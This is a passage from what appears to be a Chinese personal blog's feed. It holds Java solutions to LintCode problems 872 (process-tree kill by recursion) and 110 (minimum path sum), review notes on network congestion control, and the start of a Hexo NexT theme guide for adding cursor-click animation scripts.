    <content type="html"><![CDATA[<p><a href="https://www.lintcode.com/problem/872/">Lintcode 872. 终止进程</a></p><p>难度：中等</p><span id="more"></span><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><p>描述</p><p>这个问题中. 每个进程都有一个唯一的 <strong>PID(进程id)</strong> 和 <strong>PPID(父进程id)</strong>。每个进程只有一个父进程，但可能有一个或多个子进程，这就像一个树形结构。并且只有一个进程的PPID是0，这意味着这个进程没有父进程。所有的pid都是不同的正整数。</p><p>我们使用两个整数列表来表示进程列表，其中第一个列表包含每个进程的PID，第二个列表包含对应的PPID。</p><p>现在给定这两个列表，以及一个你要终止(kill)的进程的ID，返回将在最后被终止的进程的PID列表。（当一个进程被终止时，它的所有子进程将被终止。返回的列表没有顺序要求）</p><hr><p>给定的kill id一定是PID列表中的某个id给定的PID列表中至少含有一个进程</p><p>样例</p><p><strong>样例 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入: PID = [1, 3, 10, 5], PPID = [3, 0, 5, 3], killID = 5</span><br><span class="line">输出: [5, 10]</span><br><span class="line">解释: 终止进程5同样会终止进程10.</span><br><span class="line">     3</span><br><span class="line">   /   \</span><br><span class="line">  1     5</span><br><span class="line">       /</span><br><span class="line">      10</span><br></pre></td></tr></table></figure><p><strong>样例 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: PID = [1, 2, 3], PPID = [0, 1, 1], killID = 2</span><br><span class="line">输出: [2]</span><br></pre></td></tr></table></figure><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><p>一个简单的深度优先搜索算法，使用递归实现。</p><p>找到终止kill需要的进程-&gt;找到kill的所有子孙进程-&gt;找到kill的所有子进程的子孙进程-&gt;递归</p><p>最小问题：终止一个没有子进程的进程p：单纯返回只有一个元素p的ArrayList。</p><h4 id="程序展示"><a href="#程序展示" class="headerlink" title="程序展示"></a>程序展示</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> pid: the process id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ppid: the parent process id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> kill: a PID you want to kill</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>: a list of PIDs of processes that will be killed in the end</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">killProcess</span><span class="params">(List&lt;Integer&gt; pid, List&lt;Integer&gt; ppid, <span class="keyword">int</span> kill)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Write your code here</span></span><br><span class="line">        List&lt;Integer&gt; tokill = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">//先添加进程kill</span></span><br><span class="line">        tokill.add(kill);</span><br><span class="line">        <span class="comment">//添加kill的子进程</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ppid.size();i++)&#123;</span><br><span class="line">            <span class="comment">//找到kill的子进程后，递归调用kill子进程</span></span><br><span class="line">            <span class="keyword">if</span>(ppid.get(i)==kill)&#123;</span><br><span class="line">                tokill.addAll(killProcess(pid, ppid, pid.get(i)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tokill;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Java复习-预习-："><a href="#Java复习-预习-：" class="headerlink" title="Java复习(预习)："></a>Java复习(预习)：</h4><p><strong>Java ArrayList addAll() 方法</strong></p><p>addAll() 方法将给定集合中的所有元素添加到 arraylist 中。</p><p>addAll() 方法的语法为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arraylist.addAll(<span class="keyword">int</span> index, Collection c)</span><br></pre></td></tr></table></figure><p><strong>注：</strong>arraylist 是 ArrayList 类的一个对象。</p><p><strong>参数说明：</strong></p><ul><li>index（可选参数）- 表示集合元素插入处的索引值</li><li>c - 要插入的集合元素</li></ul><p>如果 index 没有传入实际参数，元素将追加至数组的最末尾。</p><p><strong>返回值</strong></p><p>如果成功插入元素，返回 true。</p><p>如果给定的集合为 null，则超出 NullPointerException 异常。</p><p>注意：如果 index 超出范围，则该方法抛出 IndexOutOfBoundsException 异常。</p><p><strong>泛型相关</strong></p><p>List是一个接口，而ArrayList是List接口的一个实现类。 ArrayList类是继承AbstractList抽象类和实现List接口的一个实现类。 向自己的对象引用，而ArrayList实现类的实例对象就在这充当了这个指向List接口的对象引用。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.lintcode.com/problem/872/&quot;&gt;Lintcode 872. 终止进程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;难度：中等&lt;/p&gt;</summary>
    
    
    
    
    <category term="LintCode" scheme="http://example.com/tags/LintCode/"/>
    
    <category term="深度优先搜索" scheme="http://example.com/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"/>
    
    <category term="递归" scheme="http://example.com/tags/%E9%80%92%E5%BD%92/"/>
    
  </entry>
  
  <entry>
    <title>LintCode+java：101-最小路径和</title>
    <link href="http://example.com/2022/01/15/LintCode-java%EF%BC%9A101-%E6%9C%80%E5%B0%8F%E8%B7%AF%E5%BE%84%E5%92%8C/"/>
    <id>http://example.com/2022/01/15/LintCode-java%EF%BC%9A101-%E6%9C%80%E5%B0%8F%E8%B7%AF%E5%BE%84%E5%92%8C/</id>
    <published>2022-01-14T18:01:08.000Z</published>
    <updated>2022-01-14T18:04:27.960Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.lintcode.com/problem/110/">Lintcode 110. 最小路径和</a></p><p>难度：简单</p><span id="more"></span><h4 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h4><p>给定一个只含非负整数的$m*n$网格，找到一条从左上角到右下角的可以使数字和最小的路径。</p><hr><p>你在同一时间只能向下或者向右移动一步</p><p>样例</p><p><strong>样例 1：</strong></p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grid = [[1,3,1],[1,5,1],[4,2,1]]</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><p>解释：</p><p>路线为： 1 -&gt; 3 -&gt; 1 -&gt; 1 -&gt; 1</p><p><strong>样例 2：</strong></p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grid = [[1,3,2]]</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure><p>解释：</p><p>路线是： 1 -&gt; 3 -&gt; 2</p><p><strong>描述</strong><br>给定一个只含非负整数的m*n网格，找到一条从左上角到右下角的可以使数字和最小的路径。</p><p>你在同一时间只能向下或者向右移动一步</p><p><strong>样例</strong><br>[[1,3,1],</p><p>[1,5,1],</p><p>[4,2,1]]</p><p>输出: 7</p><p>路径: 1 -&gt; 3 -&gt; 1 -&gt; 1 -&gt; 1</p><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h4><p>动态规划问题，坐标型动态规划</p><p>建立$sumL[][]$数组存储到达每个节点的数字和最小路径</p><p>我们可以发现：</p><ol><li><p>$sumL[0][0]=grid[0][0]$</p></li><li><p>第0行，第0列没有上方元素，或者没有左方元素，即$sumL[0][i] = grid[0][i] + sumL[0][i-1]$ ，$sumL[i][0] = grid[i][0] + sumL[i-1][0]$</p></li><li>对其余位置i，j，如果其左，上元素都确定的话，有$sumL[i][j] = Math.min(sumL[i][j-1], sumL[i-1][j]) + grid[i][j]$</li><li>最后的结果即完全更新完毕后的sumL数组中的$sumL[xlen-1][ylen-1]$值，其中xlen和ylen分别为grid数组的行数与列数</li></ol><h4 id="程序展示："><a href="#程序展示：" class="headerlink" title="程序展示："></a>程序展示：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> grid: a list of lists of integers</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>: An integer, minimizes the sum of all numbers along its path</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPathSum</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> xlen = grid.length;</span><br><span class="line">        <span class="keyword">int</span> ylen = grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="comment">// write your code here</span></span><br><span class="line">        <span class="keyword">int</span>[][] sumL = <span class="keyword">new</span> <span class="keyword">int</span>[xlen][ylen];</span><br><span class="line">        <span class="comment">//初始位置sumL[0][0]</span></span><br><span class="line">        sumL[<span class="number">0</span>][<span class="number">0</span>] = grid[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//更新第一行</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;ylen;i++)&#123;</span><br><span class="line">            sumL[<span class="number">0</span>][i] = grid[<span class="number">0</span>][i] + sumL[<span class="number">0</span>][i-<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新第一列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;xlen;i++)&#123;</span><br><span class="line">            sumL[i][<span class="number">0</span>] = grid[i][<span class="number">0</span>] + sumL[i-<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新剩下的位置</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;xlen;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;ylen;j++)&#123;</span><br><span class="line">                sumL[i][j] = Math.min(sumL[i][j-<span class="number">1</span>], sumL[i-<span class="number">1</span>][j]) + grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回右下角的sumL</span></span><br><span class="line">        <span class="keyword">return</span> sumL[xlen-<span class="number">1</span>][ylen-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.lintcode.com/problem/110/&quot;&gt;Lintcode 110. 最小路径和&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;难度：简单&lt;/p&gt;</summary>
    
    
    
    
    <category term="LintCode" scheme="http://example.com/tags/LintCode/"/>
    
    <category term="动态规划" scheme="http://example.com/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>计网复习：拥塞控制</title>
    <link href="http://example.com/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/"/>
    <id>http://example.com/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/</id>
    <published>2022-01-14T16:50:02.000Z</published>
    <updated>2022-01-14T17:00:45.579Z</updated>
    
    <content type="html"><![CDATA[<p>数据通信与网络24章 前半部分</p><span id="more"></span><h3 id="数据通信量"><a href="#数据通信量" class="headerlink" title="数据通信量"></a>数据通信量</h3><h5 id="通信量描述符"><a href="#通信量描述符" class="headerlink" title="通信量描述符"></a>通信量描述符</h5><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005120833.png" alt="image-20220115005120833"></p><p>平均数据速率=一段时间内发送数据比特数/时间</p><p>峰值数据速率=平均数据速率最大值：重要，它表明了让通信量通过网络而无需改变数据流的情况下，网络所需的峰值带宽</p><p>最大突发长度=峰值速率传输通信量持续时间的最大值：如果峰值持续时间很短可以忽略不计</p><p>有效带宽=网络需要分配给通信留的带宽。f(平均数据速率，峰值速率，最大突发长度) 计算过程很复杂。</p><h5 id="通信量特征值"><a href="#通信量特征值" class="headerlink" title="通信量特征值"></a>通信量特征值</h5><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005150444.png" alt="image-20220115005150444"></p><p>恒定比特率CBR：数据速率恒定不变</p><p>可变比特率VBR：数据流速率随时间平滑变化（（不是几句的突然的）</p><p>突发性数据 bursty data：短时间内数据速率突然发生变化：为了处理这种，需要重新整形技术进行重新整形</p><p>突发性通信量时网络中拥塞的主要原因之一</p><h4 id="拥塞"><a href="#拥塞" class="headerlink" title="拥塞"></a>拥塞</h4><p>拥塞：网络中的载荷（发闪送到网络中的分组数量）超过网络容量，即可能发生</p><p>拥塞控制：控制拥塞和时载荷抵御网络容量的机制和技术</p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005207933.png" alt="image-20220115005207933"></p><p>为什么发生？</p><p>1.分组到达速率高举分组处理速率，输入队列越来越长</p><p>2.分组转发速率抵御分组处理速率输出队列也会越来越长</p><p>网络性能</p><p>两个测试网络性能的要素：延迟和吞吐量</p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005226352.png" alt="image-20220115005226352"></p><p>延迟：载荷必容量小得多时，延迟最小，载荷大于网络容量时，延迟变为无穷大</p><p>吞吐量：网络吞吐量定义为单位时间内通过网络的分组数量：当载荷小于网络容量，吞吐量随载荷增加成比例增长，载荷达到网络容量时，期望吞吐量却不会恒定，而是急剧下降（丢弃分组 ，之后网络中分组数量也不会少，源端会重发，加重延迟和阻塞）</p><h4 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h4><p>两大类：开环拥塞控制（预防），闭环拥塞控制 (消除)</p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005247592.png" alt="image-20220115005247592"></p><h4 id="开环拥塞控制"><a href="#开环拥塞控制" class="headerlink" title="开环拥塞控制"></a>开环拥塞控制</h4><p><strong>重传策略</strong></p><p>有时<em>重发不可避免</em>，而重发会增加拥塞现象，但是一个<em>好的重传策略可以预防拥塞</em></p><p><strong>窗口策略</strong></p><p>发送方窗口类型会影响拥塞，对拥塞控制了而言，选择重复窗口优于回退n帧窗口</p><p><strong>确认策略</strong></p><p>接收方确认策略也可影响拥塞，如果接收方并不对它所接收的每个分组都进行确认，则它会使发送方放慢发送速度，从而预防拥塞（？？？）</p><p><strong>丢弃策略</strong></p><p>路由器用好的丢弃策略可以预防拥塞，同时不破哦坏传输的完整性。eg：声音传输时丢弃不明干的分组，仍能保证通信声音质量</p><p><strong>许可策略</strong></p><p>虚电路网络中的一种QOS机制，也能预防拥塞。</p><h3 id="闭环拥塞控制"><a href="#闭环拥塞控制" class="headerlink" title="闭环拥塞控制"></a>闭环拥塞控制</h3><p>拥塞发生后，用闭环拥塞控制可以缓解拥塞状况</p><p><strong>背压</strong></p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005311932.png" alt="image-20220115005311932"></p><p>仅用于虚电路网络，因为必须要知道其上行节点。</p><p>一个用色点停止接收来自直接上行节点的数据，这样上行节点只进不出，也会拥塞，这样一次拥塞传播到源端。</p><p>被压技术时点到点的拥塞控制</p><p><strong>抑制分组</strong></p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005320519.png" alt="image-20220115005320519"></p><p>抑制分组时一个有节点发送给源端的分组，通知其发生了拥塞情况（注意这里时直接传到源端的）如ICMP源站点抑制报文</p><p><strong>隐含信令</strong></p><p>拥塞节点，节点，源端间没有通信，源端自行察觉，例如源端发送多个分组暂时没有得到确认。</p><p>eg：TCP拥塞控制</p><p><strong>显式信令</strong></p><p>大概与抑制分组方法相似，不同处在于：信号包含再携带数据的分组中。</p><p>前向信令：提示目的端网络发生拥塞</p><p>后向信令：提示源端网络发生拥塞</p><h3 id="两个例子"><a href="#两个例子" class="headerlink" title="两个例子"></a>两个例子</h3><h4 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h4><h5 id="拥塞窗口"><a href="#拥塞窗口" class="headerlink" title="拥塞窗口"></a>拥塞窗口</h5><p>实际窗口大小=min(rwnd,cwnd) rwnd：接收方缓冲空间大小，cwnd：拥塞窗口大小</p><h5 id="拥塞策略"><a href="#拥塞策略" class="headerlink" title="拥塞策略"></a>拥塞策略</h5><p>慢速启动，拥塞避免，拥塞检测。</p><h6 id="慢速启动：指数增长"><a href="#慢速启动：指数增长" class="headerlink" title="慢速启动：指数增长"></a>慢速启动：指数增长</h6><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005334497.png" alt="image-20220115005334497"></p><p>慢启动：指数增长，TCP拥塞控制所使用一种算法为慢速启动</p><p>开始时设置拥塞窗口大小(cwnd)为一个最大段长度MSS（MSS在连接建立期间由最大段长度选项决定）</p><p>每次收到一个ACK确认时，窗口大小增加一个MSS值，窗口慢速启动，但每次将所有段传输并收到ACK后，cwnd大小相当于按指数按规律增长。</p><p>当慢速启动到达阈值时停止，这个阈值由发送方保存的一个变量（ssthresh慢速启动阈值）决定，在大多数实现中，ssthresh值为65535字节。</p><p>图中这里省略了MSS的大小(MSS=1，实际不可能这样)</p><h6 id="拥塞避免：加性增加"><a href="#拥塞避免：加性增加" class="headerlink" title="拥塞避免：加性增加"></a>拥塞避免：加性增加</h6><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005353703.png" alt="image-20220115005353703"></p><p>拥塞窗口大小达到阈值，慢速启动停止，碱性增加开始，这样，每次整个窗口所有段都确认后，cwnd+1</p><p>拥塞窗口大小线性增加知道检测到拥塞</p><h6 id="拥塞检测：乘性减少"><a href="#拥塞检测：乘性减少" class="headerlink" title="拥塞检测：乘性减少"></a>拥塞检测：乘性减少</h6><p>复习：发生重传==重传计时器到时 or 收到了三个ACK</p><p><strong>计时器倒时</strong>存在非常严重的拥塞可能性：</p><p>a.设置阈值为当前cwnd的一半</p><p>b.设置cwnd为1个MSS</p><p>c.启动慢速启动阶段</p><p><strong>接收到三个ACK</strong>存在轻度拥塞的可能性：</p><p>a.设置阈值为当前cwnd的一半</p><p>b.设置cwnd为阈值</p><p>c.启动拥塞避免阶段</p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005433172.png" alt="image-20220115005433172"></p><p>如图是一个例子</p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005455533.png" alt="image-20220115005455533"></p><h4 id="帧中继中的拥塞控制"><a href="#帧中继中的拥塞控制" class="headerlink" title="帧中继中的拥塞控制"></a>帧中继中的拥塞控制</h4><p>2个位明确提示源端与目的端拥塞发生，即只有拥塞避免措施。</p><p>BECN 后向显示拥塞通知—&gt;：用来提示发送方网络中的拥塞情况。</p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005506089.png" alt="image-20220115005506089"></p><p>FECN 前向显示拥塞通知&lt;—：用来提示接收方网络中的拥塞情况。</p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005511529.png" alt="image-20220115005511529"></p><p><img src="/2022/01/15/%E8%AE%A1%E7%BD%91%E5%A4%8D%E4%B9%A0%EF%BC%9A%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/image-20220115005523462.png" alt="image-20220115005523462"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;数据通信与网络24章 前半部分&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="期末复习" scheme="http://example.com/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>hexo_next_blog搭建</title>
    <link href="http://example.com/2022/01/13/hexo-next-blog%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2022/01/13/hexo-next-blog%E6%90%AD%E5%BB%BA/</id>
    <published>2022-01-13T07:44:54.000Z</published>
    <updated>2022-04-04T18:40:37.697Z</updated>
    
    <content type="html"><![CDATA[<p>搭建hexo，NexT主题博客时收集到的部分内容</p><span id="more"></span><h3 id="添加鼠标点击效果"><a href="#添加鼠标点击效果" class="headerlink" title="添加鼠标点击效果"></a>添加鼠标点击效果</h3><p>基本copy该网址内容，但是其实只需要改动_layout.swig即可，没必要新建swig文件</p><p><a href="https://blog.csdn.net/qq_42889280/article/details/103087564">https://blog.csdn.net/qq_42889280/article/details/103087564</a></p><p>在主题theme/next的 <code>_config.yml</code> 中添加动态配置项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  type: love  # fireworks：礼花 | explosion：爆炸 | love：浮出爱心 | text：浮出文字</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 /themes/next/layout/_layout.swig，添加如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if theme.cursor_effect %&#125;</span><br><span class="line">  &#123;% if theme.cursor_effect.type == &quot;fireworks&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/fireworks.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;% elseif theme.cursor_effect.type == &quot;explosion&quot; %&#125;</span><br><span class="line">    &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;script src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/explosion.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;% elseif theme.cursor_effect.type == &quot;love&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/love.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;% elseif theme.cursor_effect.type == &quot;text&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/text.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>添加时注意：粘到body标签里面</p><p>将以下四个JS文件复制到目录 /themes/next/source/js/cursor/ 下</p><p>fireworks.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 